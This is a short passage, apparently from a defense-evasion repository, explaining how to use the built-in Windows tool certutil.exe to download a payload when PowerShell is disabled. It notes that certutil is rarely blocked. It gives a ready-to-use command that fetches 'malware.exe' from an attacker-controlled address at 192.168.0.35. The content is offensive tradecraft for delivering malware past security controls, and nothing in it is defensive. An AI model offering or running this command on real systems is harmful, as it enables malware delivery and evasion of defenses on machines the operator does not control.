It's pretty handy to use when other tools for downloading files (for example powershell) are disabled.
Since certutil.exe is a built-in windows tool it normally isn't blocked.

You can use Certutil to download your payload with this command :
```
certutil.exe -urlcache -f http://192.168.0.35/malware.exe malware.exe
```
![OIP (9)](https://github.com/0x074b/Defense-Evasion/assets/83349783/f2a8577a-93fe-47f3-9a87-f9670881ca88)
